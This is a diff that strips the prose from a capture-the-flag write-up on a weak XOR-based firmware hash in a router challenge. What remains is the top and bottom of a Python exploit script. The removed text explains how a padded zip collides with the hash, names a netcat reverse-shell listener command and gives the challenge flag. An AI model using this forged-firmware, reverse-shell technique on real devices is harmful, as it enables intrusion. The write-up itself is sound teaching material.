@@ -1,20 +1,3 @@
-# [HV23.13] Santa's Router
-
-A router with firmware update capabilities, how nice of Santa.
-
-After checking the source code for some time, I realized that the `hasFile` function, had a serious flaw, it always `XOR`'ed 8-byte chunks to the current hash.
-
-```py
-def hashFile(fileContent:bytes) -> int:
-    hash = 0
-    for i in range(0, len(fileContent), 8):
-        hash ^= sum([fileContent[i+j] << 8*j for j in range(8) if i+j < len(fileContent)])
-    return hash
-```
-
-This means we can craft a zip archive, pad it to `// 8` and then add the 8 bytes of "hash difference" with swapped endianess to the zip file.
-
-```py
 import base64
 import io
 import zipfile
@@ -55,10 +38,3 @@ data = conn.recvuntil(b"$ ").splitlines()[0]
 status_code = int(data.split()[-1])
 success(f"{data.splitlines()[0].decode()} {chr(status_code)}")
 conn.close()
-```
-
-Open up a listener using `nc -nvlp 4444`
-
-The script gives us a reverse shell after executing, we can now print the flag.
-
-Flag: `HV23{wait_x0r_is_not_a_secure_hash_function}`
